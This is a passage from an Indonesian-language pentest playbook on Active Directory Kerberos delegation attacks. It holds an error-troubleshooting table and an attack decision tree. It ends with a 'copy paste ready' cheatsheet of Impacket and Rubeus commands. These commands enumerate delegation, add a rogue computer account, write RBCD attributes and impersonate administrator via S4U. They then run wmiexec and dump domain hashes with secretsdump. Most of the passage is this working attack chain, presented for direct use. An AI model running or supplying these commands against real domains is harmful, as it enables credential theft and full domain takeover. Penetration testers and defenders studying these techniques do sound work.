|`KDC_ERR_S_PRINCIPAL_UNKNOWN`|SPN tidak ada di AD|`setspn -Q */targethost` untuk lihat SPN yang valid|
|`KDC_ERR_PREAUTH_FAILED`|Password/hash salah|Verifikasi creds dengan `nxc smb` dulu|
|`KDC_ERR_C_PRINCIPAL_UNKNOWN`|Username salah atau tidak ada|Cek format `USER@DOMAIN` vs `DOMAIN\USER`|
|`KDC_ERR_CLIENT_REVOKED`|Account disabled/locked|Cari account lain yang aktif|
|`KDC_ERR_POLICY`|Protected Users group atau delegation diblokir policy|Coba user lain, `Protected Users` tidak bisa di-delegate|
|`LDAP constraint violation`|MAQ=0 atau quota penuh|Cari existing controlled machine account|
|`RBCD attribute empty setelah write`|Replication delay atau permission gagal|Tunggu 60 detik, verifikasi ACL ulang|
|`getST S4U2Proxy error`|RBCD belum aktif atau SPN salah|Tunggu replikasi, coba HOST SPN|
|`klist kosong setelah export`|`KRB5CCNAME` tidak set|`export KRB5CCNAME="$PWD/file.ccache"`|
|`Access denied` setelah PTT|Authentication ok tapi authorization gagal|Verifikasi user yang di-impersonate punya akses ke target|
|`Clock skew` persisten|Sistem tidak sync otomatis|`sudo timedatectl set-ntp false && sudo ntpdate -u $DC_IP`|
|`addcomputer.py LDAPS failed`|LDAPS tidak listen / cert issue|Coba `-method SAMR` sebagai gantinya|
|`findDelegation.py empty`|Tidak ada delegation atau credentials salah|Verifikasi creds, coba LDAP query manual|

**Jika buntu total — Google Search yang efektif:**

text

```
# Template pencarian:
site:github.com RBCD impacket [error message]
"KDC_ERR_BADOPTION" getST.py S4U2Proxy solution
Active Directory delegation [error] bypass [tahun]
HackTricks RBCD exploitation [kondisi spesifik]
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Punya credentials domain
│
├─ FASE 0: Sync waktu DC, verifikasi creds
│
├─ FASE 1: Enumerate delegation
│   ├─ findDelegation.py
│   ├─ BloodHound queries
│   └─ Check MachineAccountQuota
│
├─ [Unconstrained non-DC ditemukan]
│   └─ FASE 2: Unconstrained Exploitation
│       ├─ Sudah punya shell di mesin? → Monitor TGT via Rubeus
│       ├─ Perlu trigger? → Coercion (PetitPotam/PrinterBug)
│       ├─ TGT didapat → PTT
│       └─ DCSync → All hashes → Domain Compromise
│
├─ [Constrained w/ Protocol Transition ditemukan]
│   └─ FASE 3: S4U Attack
│       ├─ getTGT → getST (S4U2Self + S4U2Proxy)
│       ├─ Ticket impersonasi admin didapat
│       └─ Akses target via smbclient/wmiexec
│
├─ [GenericWrite/WriteDACL ke Computer ditemukan]
│   └─ FASE 4: RBCD Attack
│       ├─ MAQ > 0? → addcomputer.py
│       ├─ Write RBCD attribute → rbcd.py
│       ├─ getTGT (fake computer) → getST (impersonate)
│       ├─ Akses target
│       └─ CLEANUP rbcd.py -action flush
│
└─ FASE 5: Post-exploitation
    ├─ Dump hashes → secretsdump.py
    ├─ Lateral movement → <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
    └─ Domain persistence → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export DC_IP="10.10.10.10"; export DOMAIN="corp.local"
export USERNAME="user"; export PASSWORD="pass"
export TARGET="10.10.10.20"; export LHOST="10.10.14.5"
sudo ntpdate -u $DC_IP   # ALWAYS DO THIS FIRST

# === ENUMERATE DELEGATION ===
python3 /opt/impacket/examples/findDelegation.py "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD -d $DOMAIN --trusted-for-delegation

# === MAQ CHECK ===
ldapsearch -x -H "ldap://$DC_IP" -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
    -b "DC=corp,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota

# === UNCONSTRAINED: Rubeus monitor (di Windows shell) ===
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:administrator
.\Rubeus.exe dump /nowrap /service:krbtgt

# === CONSTRAINED: S4U via Impacket ===
python3 /opt/impacket/examples/getTGT.py "$DOMAIN/svc-web:Pass123!" -dc-ip $DC_IP
export KRB5CCNAME="$PWD/svc-web.ccache"
python3 /opt/impacket/examples/getST.py "$DOMAIN/svc-web" -k -no-pass \
    -spn "CIFS/target.corp.local" -impersonate administrator -dc-ip $DC_IP

# === RBCD: Full chain ===
python3 /opt/impacket/examples/addcomputer.py "$DOMAIN/$USERNAME:$PASSWORD" \
    -method LDAPS -computer-name "EVILPC$" -computer-pass "Evil@123!" -dc-ip $DC_IP
python3 /opt/impacket/examples/rbcd.py "$DOMAIN/$USERNAME:$PASSWORD" \
    -action write -delegate-to "TARGET$" -delegate-from "EVILPC$" -dc-ip $DC_IP
python3 /opt/impacket/examples/getTGT.py "$DOMAIN/EVILPC\$:Evil@123!" -dc-ip $DC_IP
export KRB5CCNAME="$PWD/EVILPC\$.ccache"
python3 /opt/impacket/examples/getST.py "$DOMAIN/EVILPC\$" -k -no-pass \
    -spn "CIFS/target.corp.local" -impersonate administrator -dc-ip $DC_IP

# === USE TICKET ===
export KRB5CCNAME="$PWD/administrator.ccache"; klist
python3 /opt/impacket/examples/wmiexec.py -k -no-pass "$DOMAIN/administrator@target.corp.local"
python3 /opt/impacket/examples/secretsdump.py -k -no-pass "$DOMAIN/administrator@target.corp.local"

# === CLEANUP RBCD (WAJIB real pentest) ===
python3 /opt/impacket/examples/rbcd.py "$DOMAIN/$USERNAME:$PASSWORD" \
    -action flush -delegate-to "TARGET$" -dc-ip $DC_IP
```

---

> **➡️ NEXT:** Setelah delegation berhasil dan dapat privileged access, lanjut ke:
> 
> - **`[🔐 Workflow 40 — Active Directory Certificate Services (AD CS)](/docs/adcs)`** — Jika environment punya AD Certificate Services
> - **`[🔁 Workflow 41 — NTLM Relay](/docs/ntlm-relay)`** — Untuk gabungkan coercion dengan relay attack
> - **`[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)`** — Gunakan hash/ticket untuk pivot ke mesin lain
> - **`[🔐 Workflow 43 — Domain Persistence](/docs/domain-persistence)`** — Setelah dapat DA, buat persistence